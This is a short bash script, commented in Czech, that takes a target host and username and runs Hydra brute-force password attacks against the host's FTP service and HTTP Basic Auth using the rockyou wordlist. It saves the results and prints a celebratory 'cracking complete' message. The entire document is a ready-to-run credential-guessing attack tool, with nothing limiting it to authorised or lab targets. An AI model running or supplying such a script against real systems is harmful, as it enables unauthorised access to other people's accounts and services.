#!/bin/bash

url=$1
user=$2
output_dir=$url-password-crack

# Vytvoření výstupního adresáře
mkdir -p $output_dir

# Provádí brute-force útok na FTP server
echo "[+] Running Hydra FTP brute-force attack..."
hydra -l $user -P /usr/share/wordlists/rockyou.txt ftp://$url -o $output_dir/ftp_results.txt

# Provádí brute-force útok na HTTP Basic Auth
echo "[+] Running Hydra HTTP Basic Auth brute-force attack..."
hydra -l $user -P /usr/share/wordlists/rockyou.txt http-get://$url -o $output_dir/http_basic_auth_results.txt

echo "[*] Password cracking complete! 🎉️"
